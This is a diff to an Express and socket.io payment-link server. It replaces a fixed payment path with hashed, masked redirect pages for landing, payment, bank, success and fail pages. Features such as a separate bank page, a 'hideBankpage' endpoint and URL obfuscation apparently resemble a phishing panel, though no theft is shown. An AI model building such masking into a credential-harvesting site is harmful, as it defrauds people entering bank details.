@@ -4,7 +4,54 @@ import cors from 'cors';
 import crypto from 'crypto';
 import { Server } from 'socket.io';
 import path from 'path';
+import fs from 'fs';
 
+// URL Masking System
+// Create stable hashes for URL masking
+function createHash(input) {
+  return crypto.createHash('md5').update(input).digest('hex').substring(0, 16);
+}
+
+// HTML pages to mask
+const pages = [
+  'landing.html',
+  'payment.html',
+  'success.html',
+  'fail.html',
+  'bankpage.html'
+];
+
+// Create mapping of original to masked URLs
+const urlMapping = {};
+pages.forEach(page => {
+  urlMapping[page] = createHash(page + '-salt-string');
+});
+
+// Generate redirect HTML files
+Object.entries(urlMapping).forEach(([originalPage, maskedPath]) => {
+  const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Processing Payment</title>
+  <script>
+    // Preserve query parameters when redirecting
+    window.location.replace('/${originalPage}' + window.location.search);
+  </script>
+</head>
+<body>
+  <p>Processing payment, please wait...</p>
+</body>
+</html>
+  `;
+  
+  fs.writeFileSync(`${maskedPath}.html`, htmlContent);
+  console.log(`Created: ${maskedPath}.html -> ${originalPage}`);
+});
+
+console.log('URL Mappings:', urlMapping);
+
+// Initialize Express app
 const app = express();
 app.use(bodyParser.json());
 app.use(cors({
@@ -12,31 +59,19 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Generate a fixed random string to use for all payment links
-// Using a fixed string ensures links don't change between server restarts
-const PAYMENT_PATH = 'secure-payment-gateway';
-
 // Serve static files
 app.use(express.static("."));
-
-// Special route for the masked payment link that should come AFTER static files middleware
-app.get(`/${PAYMENT_PATH}`, (req, res) => {
-  // Forward the request to landing.html with all query parameters intact
-  const fullPath = path.join(process.cwd(), 'landing.html');
-  res.sendFile(fullPath);
-});
 
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  console.log(`Payment URL path: /${PAYMENT_PATH}`);
 });
 
 const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Payment Links Endpoints - ONLY modify this function
+// Payment Links Endpoints
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -52,8 +87,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Use the masked URL for payment link
-    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_PATH}?pid=${invoiceId}`;
+    // Use the masked URL instead of 'landing.html'
+    const maskedPath = urlMapping['landing.html'];
+    const paymentLink = `${protocol}://${req.get('host')}/${maskedPath}.html?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -69,9 +105,6 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// The rest of your code remains completely unchanged - leave all other functions as they are
-
-// All your other API endpoints remain the same
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -224,6 +257,7 @@ app.post('/api/hideBankpage', (req, res) => {
   res.json({ status: 'success' });
 });
 
+// NEW: Add transaction data endpoints for success and fail pages
 app.get('/api/getTransactionForSuccess', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
